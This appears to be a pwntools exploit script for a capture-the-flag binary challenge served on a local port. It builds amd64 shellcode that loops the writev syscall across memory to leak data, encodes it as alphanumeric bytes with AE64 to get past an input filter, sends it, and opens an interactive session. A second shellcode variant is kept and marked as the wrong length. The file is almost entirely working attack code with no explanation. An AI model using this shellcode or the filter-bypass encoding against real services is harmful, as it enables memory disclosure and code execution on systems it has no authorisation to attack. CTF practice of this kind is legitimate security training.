# -*- coding: UTF-8 -*-
from pwn import *
from ae64 import AE64

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('127.0.0.1', 49153)
#io = process('./code_project_bck')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


# (1,0x601080,1) *rsi = 0x1000  *rsi+8 = 0x30
shellcode = '''
push 1
pop rdi
push 0x601080
pop rsi
push 1
pop rdx
push 0x30
pop r14
mov [rsi+8],r14
push 0x1000
pop r15
mov [rsi],r15
search:
    push 0x14
    pop rax
    syscall
    add [rsi], r15
    jmp search
'''
shellcode_1 = ''' /*长度不合适*/
push 1
pop rdi 
push 0x1
pop rdx
mov esi, 0x1010101
xor esi, 0x1611181
push 0x1601101
pop r14
xor r14, 0x1010101
push 0x1011101
pop r15
xor r15,0x1010101
search:
    add r14, r15 /*r14: addr*/
    mov [rsi], r15
    mov [rsi+8], r15
    push SYS_writev
    pop rax
    syscall
    jmp search
'''
payload = AE64().encode(asm(shellcode,arch='amd64'),'rdx')
print(payload)
#gdb.attach(io)
sn(payload)
irt()
